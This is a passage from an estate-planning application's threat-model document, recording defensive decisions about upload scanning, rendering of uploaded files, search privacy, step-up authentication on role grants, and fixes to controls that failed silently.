- *`documents.title` remains plaintext* (the M4 decision, on the
  `assets_view.title` precedent). The generate form now says so where the field
  is, rather than leaving users to infer that the title is protected like the
  contents.
- *`script-src` is still not locked down*, exactly as §6d states. The sandbox
  does not depend on it: `sandbox=""` blocks script execution inside the frame
  whatever the page policy permits outside it.

**PR2 addendum — ingest, the ladder, and deletion (2026-08-06).**

*The upload gate is the SERVER's, and the client is built not to have an
opinion.* Magic-byte sniffing against the declared mime is the control against
polyglot mislabeling, and the malware scan is fail-closed and pre-storage, so
every refusal means the bytes reached no disk. A client-side type check would
be a second opinion that can disagree with the one that matters — so there is
none: `accept` is a picker hint, `file.type` is forwarded as a declaration, and
the only local check is the size cap, mirroring the server's own number. The
three refusals are kept apart to the last layer (`MALWARE_DETECTED`,
`UNSUPPORTED_CONTENT`, `SCAN_UNAVAILABLE`) because softening a positive scanner
finding into "unsupported file type" would withhold the one thing a user needs
to know about a file somebody sent them. Verified live against real clamd
through the browser: the signature-carrying PNG was refused and nothing stored.

*The execution ladder is computed where the requirements are verified.* Risk #8
is a legal/compliance failure in a state template, treated by "attorney-gated
template releases; per-state execution-requirement engine". A UI that hardcoded
the ladder would be a second copy of that engine, drifting toward the weakest
rung — which is precisely the fail-open the M4 review closed inside the
service. So the service returns `allowedTransitions` from its own
sha256-verified template source, the UI renders exactly that, and the write
path re-resolves the requirements inside its own transaction regardless. An
unverifiable template yields an EMPTY ladder, not a guessed one.

*Presenting an uploaded binary — the decision PR1 deferred.* Images render
INLINE from a `data:` URI: the page CSP already allows `img-src 'self' data:`,
the bytes reach the browser's image decoder (the same exposure any image on any
page carries), and a `data:` URI cannot reach the network. The mime is the
SERVICE's sniffed value, not the uploader's claim, and it is checked against a
closed set before it is interpolated, so no attacker-chosen string becomes the
type of a URI this page constructs. PDFs and TIFFs DOWNLOAD instead: a framed
PDF is the browser's PDF engine — a large parser — invoked on attacker-supplied
bytes inside our own frame tree, whereas a download hands the file to whatever
the user already trusts. The filename is generated from ids, never from
`documents.title`, because a filename is where user text ends up in a shell, a
sync client, or a mail header. Leaving this deferred a second time had a cost
the M12 review named: `Read` was offered for versions the viewer then refused,
so an audited decrypt was spent to display nothing.

*The search term left the URL.* `GET /v1/documents/search?q=` was M4's shape,
and M12 was its first caller. The term is by construction a word out of the
user's own estate — a beneficiary's name, a property address — and a query
string is the one part of a request intermediaries record by default; the
topology docs/01 §2 describes puts CloudFront and WAF access logs in that path.
It is a POST with the term in the body now. Nothing else changed: the term is
still reduced to per-user HMAC tokens and matched ciphertext-side, and no
decrypt happens to serve a search.

*Deletion.* Step-up gated per docs/01 §5, and the legal hold wins over the
owner. Running the real app exposed an ordering seam worth recording: the
step-up guard sits at the controller and the hold check inside the handler, so
a stale session is told `stepup_required` first and the hold only after. That
ordering is fine as defence in depth, but the UI must not send someone to find
an authenticator for an action that will be refused either way — a held
document is now not offered for deletion at all. RECORDED, NOT CHANGED: the
service's ordering, since moving the hold check ahead of the guard would put an
unauthenticated-for-this-action read of estate state before the gate.

## 6f. Threat-model delta — M13 people surface PR1 (2026-08-06)

M13 gives the M2 profile & contacts service its first consumer. PR1 hardens what
was already deployed, before anything is built on top; the surface itself (PR2)
and the contact-link ceremony (PR3) extend this section.

**TB8 (role-holders → owner's estate data) had no step-up gate on its own
control objects.** §5.5's boundary is enforced by `role_assignments` and
`permission_grants` — they are the data that decides what a beneficiary can
read. Creating one is a docs/01 §5 step-up action in terms ("trustee/executor
changes, beneficiary changes"), and M2 shipped all three mutation routes under
`CallerGuard` alone because it predates `@estate/auth-guard`; the sibling
beneficiary route in the asset service complied. So a bearer token stolen from a
live session was sufficient to name a trustee over an entire estate. Closed:
grant, revoke and permission-attach all require a step-up fresh within 5
minutes, uniformly across all twelve roles.

*Why revoke is gated and permission-withdrawal is not.* The M6 rule is that the
protective action must never be HARDER than the permissive one — equal is
allowed. Revoking an assignment is not purely protective in this domain: it
destroys the executor-resolution path M7 depends on and can strip the last
linked contact able to report a death or rescue a §5.1 case, so an attacker who
revokes is isolating the owner, not protecting them. Withdrawing one permission
grant genuinely only narrows, so it is `CallerGuard`-only — an owner who can see
a grant they regret must be able to pull it without first finding their
authenticator.

**A §5.1 control was revocable by accident, twice.** `contacts.linked_user_id`
is the anti-enumeration gate this document credits (§6b: intake "cannot
enumerate" *because* reporters must already be named by the decedent's contact
repository). Two ordinary, unaudited operations silently removed it:

- Editing any field of a contact cleared the column, because one encrypt helper
  hardcoded it null and fed both the insert and the update. Closed by type: the
  shape both statements are built from has no such key.
- Soft-deleting a contact left its `role_assignments` live while every
  role-holder query joins `contacts ... AND deleted_at IS NULL`, so an executor
  stopped resolving and every grant stopped being effective with the assignment
  still listed and no `role.revoked` emitted. Closed with `409 contact_in_use`:
  retiring a fiduciary is a separate, step-up-gated, audited act.

Both are the same class as the M7/M9 findings — a control that stops working
without saying so, indistinguishable from one that is working.

**A Zone B write path destroyed the most sensitive column in the product.**
`PUT /v1/profile` was a full replace while `GET /v1/profile` returns `ssnLast4`
and never `ssn`, so any edit through any client wrote NULL over `ssn_ct` and
`ssn_last4_ct`. Now absent means unchanged. The preservation deliberately copies
CIPHERTEXT: decrypt-and-re-encrypt would put the full SSN through the service on
every unrelated edit and emit a `crypto.field.decrypted` on `profile.ssn` each
time — pure added exposure on the §5.3 bulk-decrypt path in exchange for
nothing. A row whose `dek_id` is no longer the owner's active DEK (crypto-shred)
is refused rather than re-stamped, so an erased record cannot be made to look
intact.

**RECORDED, OWED BY PR2 (§4 TB4).** Contact and family-member reads decrypt
every field, one audited `crypto.field.decrypted` each, so a list view is a
bulk-decrypt surface: twenty contacts is roughly a hundred events on the owner's
own trail per page load, and it blunts the per-principal decrypt-rate baseline
this document calls the single most important insider control. The DEK cache
means it is not a hundred KMS operations, which is the weaker half of the
control. PR1 does not change it; PR2 owes a narrowed list projection under M12's
audited-decrypt-volume rule, and this paragraph is the requirement, not an
observation.
